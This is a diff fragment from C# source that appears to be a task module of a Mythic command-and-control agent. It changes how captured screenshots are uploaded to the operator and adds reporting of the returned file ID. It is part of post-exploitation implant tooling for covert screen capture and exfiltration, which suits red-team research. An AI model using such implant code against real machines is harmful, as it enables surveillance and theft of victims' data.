@@ -82,12 +82,23 @@ namespace Tasks
                     {
                         ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
                         {
-                            return _agent.GetFileManager().PutFile(
+                            if (_agent.GetFileManager().PutFile(
                                 _cancellationToken.Token,
                                 _data.ID,
                                 screen,
                                 null,
-                                true);
+                                out string mythicFileId,
+                                true))
+                            {
+                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                    mythicFileId,
+                                    false,
+                                    ""));
+                                return true;
+                            } else
+                            {
+                                return false;
+                            }
                         }, _cancellationToken.Token);
                         uploadTasks.Add(uploadTask);
                         uploadTask.Start();
